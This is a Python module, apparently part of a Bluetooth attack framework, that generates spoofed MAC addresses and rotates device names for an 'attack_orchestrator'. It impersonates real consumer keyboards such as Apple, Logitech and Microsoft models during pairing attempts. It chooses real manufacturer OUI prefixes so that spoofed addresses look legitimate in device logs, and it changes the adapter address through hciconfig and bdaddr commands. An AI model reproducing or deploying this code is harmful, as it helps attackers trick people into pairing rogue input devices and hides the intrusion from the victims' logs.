"""
AdvertisingPayload — MAC address randomization and device name rotation.

Generates randomized Bluetooth MAC addresses and cycles through realistic
device names to masquerade as common consumer Bluetooth peripherals during
advertising. Used by the attack_orchestrator to rotate identities between
pairing attempts.
"""

import logging
import random
import subprocess
from typing import Optional

logger = logging.getLogger(__name__)

# Realistic device names that match common consumer Bluetooth keyboards.
# These names are what target devices will see in their pairing prompts.
DEFAULT_DEVICE_NAMES = [
    "Apple Magic Keyboard",
    "Logitech K380",
    "Logitech K480",
    "Logitech MX Keys",
    "Microsoft Bluetooth Keyboard",
    "Samsung Smart Keyboard",
    "Anker Ultra Compact Keyboard",
    "Razer BlackWidow V3",
    "Corsair K63 Wireless",
    "Apple Keyboard",
    "Logitech K780",
    "HP Bluetooth Keyboard",
    "Dell KB500 Wireless",
    "Brydge BT Keyboard",
    "Keychron K2",
]

# OUI prefixes from common Bluetooth device manufacturers.
# Using real OUIs makes the MAC address appear legitimate in device logs.
KNOWN_OUI_PREFIXES = [
    (0x00, 0x1A, 0x7D),  # Apple-like
    (0x28, 0x6C, 0x07),  # Apple
    (0xF4, 0xF5, 0xDB),  # Apple
    (0x00, 0x1F, 0x20),  # Logitech-like
    (0x00, 0x04, 0xF3),  # Logitech
    (0x6C, 0xB7, 0x49),  # Logitech
    (0x34, 0x88, 0x5D),  # Samsung-like
    (0x00, 0x1B, 0xDC),  # Microsoft-like
    (0x7C, 0xED, 0x8D),  # Microsoft
    (0xDC, 0xA6, 0x32),  # Raspberry Pi (for testing)
]


class AdvertisingPayload:
    """
    Generates randomized MAC addresses and rotates device names for
    Bluetooth advertising cycles.

    Each call to `next_payload()` returns a new (mac, name) pair,
    cycling through device names in a shuffled order and generating
    a fresh random MAC address each time.

    Usage:
        payload = AdvertisingPayload()
        mac, name = payload.next_payload()
        # Apply via BluetoothManager or hcitool
    """

    def __init__(
        self,
        device_names: Optional[list[str]] = None,
        oui_prefixes: Optional[list[tuple[int, int, int]]] = None,
        shuffle: bool = True,
    ):
        """
        Initialize the payload generator.

        Args:
            device_names: List of device names to rotate through.
                          Defaults to DEFAULT_DEVICE_NAMES.
            oui_prefixes: List of OUI prefix tuples (3 bytes each).
                          Defaults to KNOWN_OUI_PREFIXES.
            shuffle: Whether to shuffle the name order on initialization
                     and each full cycle.
        """
        self._device_names = list(device_names or DEFAULT_DEVICE_NAMES)
        self._oui_prefixes = list(oui_prefixes or KNOWN_OUI_PREFIXES)
        self._shuffle = shuffle
        self._name_index = 0
        self._rotation_count = 0

        if self._shuffle:
            random.shuffle(self._device_names)

    @property
    def device_names(self) -> list[str]:
        """Return the current list of device names."""
        return list(self._device_names)

    @property
    def rotation_count(self) -> int:
        """Return the total number of payloads generated so far."""
        return self._rotation_count

    @property
    def current_name_index(self) -> int:
        """Return the index of the next device name to be used."""
        return self._name_index

    def generate_random_mac(self) -> str:
        """
        Generate a random Bluetooth MAC address using a known OUI prefix.

        Returns:
            A MAC address string in XX:XX:XX:XX:XX:XX format with the
            unicast and locally-administered bits set appropriately.
        """
        oui = random.choice(self._oui_prefixes)
        # Generate 3 random bytes for the device-specific portion
        device_bytes = [random.randint(0x00, 0xFF) for _ in range(3)]
        mac = list(oui) + device_bytes
        return ":".join(f"{b:02X}" for b in mac)

    def generate_fully_random_mac(self) -> str:
        """
        Generate a fully random locally-administered MAC address.

        Sets the locally-administered bit (bit 1 of first octet) and clears
        the multicast bit (bit 0 of first octet) to ensure the address is
        a valid unicast, locally-administered address.

        Returns:
            A MAC address string in XX:XX:XX:XX:XX:XX format.
        """
        mac_bytes = [random.randint(0x00, 0xFF) for _ in range(6)]
        # Set locally-administered bit, clear multicast bit
        mac_bytes[0] = (mac_bytes[0] | 0x02) & 0xFE
        return ":".join(f"{b:02X}" for b in mac_bytes)

    def next_device_name(self) -> str:
        """
        Return the next device name in the rotation.

        Cycles through the name list, reshuffling when the end is reached
        (if shuffle is enabled).

        Returns:
            A device name string.
        """
        name = self._device_names[self._name_index]
        self._name_index += 1

        if self._name_index >= len(self._device_names):
            self._name_index = 0
            if self._shuffle:
                random.shuffle(self._device_names)

        return name

    def next_payload(self) -> tuple[str, str]:
        """
        Generate the next advertising payload: a (mac_address, device_name) pair.

        Returns:
            Tuple of (mac_address, device_name) where mac_address is a fresh
            random MAC and device_name is the next name in the rotation.
        """
        mac = self.generate_random_mac()
        name = self.next_device_name()
        self._rotation_count += 1
        logger.debug("Payload #%d: MAC=%s, Name='%s'", self._rotation_count, mac, name)
        return mac, name

    def apply_payload(
        self,
        bluetooth_manager,
        adapter_name: str = "hci0",
    ) -> tuple[str, str]:
        """
        Generate and apply the next payload to the Bluetooth adapter.

        Sets the adapter alias to the next device name. MAC address spoofing
        is returned but must be applied at the HCI level (bdaddr tool or
        similar) as BlueZ does not support runtime MAC changes via D-Bus.

        Args:
            bluetooth_manager: A BluetoothManager instance.
            adapter_name: Adapter name for HCI commands.

        Returns:
            Tuple of (mac_address, device_name) that was applied.
        """
        mac, name = self.next_payload()
        bluetooth_manager.alias = name
        logger.info("Applied payload: alias='%s', suggested_mac='%s'", name, mac)
        return mac, name

    @staticmethod
    def apply_mac_via_bdaddr(mac: str, adapter: str = "hci0") -> bool:
        """
        Attempt to spoof the MAC address using the bdaddr utility.

        Note: bdaddr requires the adapter to be down, and hardware support
        varies. This is best-effort — returns False if bdaddr is not
        available or the command fails.

        Args:
            mac: Target MAC address in XX:XX:XX:XX:XX:XX format.
            adapter: Bluetooth adapter name.

        Returns:
            True if the MAC was successfully set, False otherwise.
        """
        try:
            subprocess.run(
                ["hciconfig", adapter, "down"],
                check=True,
                capture_output=True,
            )
            result = subprocess.run(
                ["bdaddr", "-i", adapter, mac],
                check=True,
                capture_output=True,
            )
            subprocess.run(
                ["hciconfig", adapter, "up"],
                check=True,
                capture_output=True,
            )
            logger.info("MAC address spoofed to %s on %s", mac, adapter)
            return True
        except (subprocess.CalledProcessError, FileNotFoundError) as e:
            logger.warning("Failed to spoof MAC on %s: %s", adapter, e)
            # Try to bring adapter back up if it was taken down
            try:
                subprocess.run(
                    ["hciconfig", adapter, "up"],
                    capture_output=True,
                )
            except Exception:
                pass
            return False

    @staticmethod
    def validate_mac(mac: str) -> bool:
        """
        Validate that a string is a properly formatted MAC address.

        Args:
            mac: MAC address string to validate.

        Returns:
            True if the MAC is valid XX:XX:XX:XX:XX:XX format.
        """
        parts = mac.split(":")
        if len(parts) != 6:
            return False
        try:
            for part in parts:
                if len(part) != 2:
                    return False
                val = int(part, 16)
                if val < 0 or val > 255:
                    return False
            return True
        except ValueError:
            return False

    def reset(self) -> None:
        """Reset the rotation counter and name index to start fresh."""
        self._name_index = 0
        self._rotation_count = 0
        if self._shuffle:
            random.shuffle(self._device_names)
        logger.info("AdvertisingPayload reset")
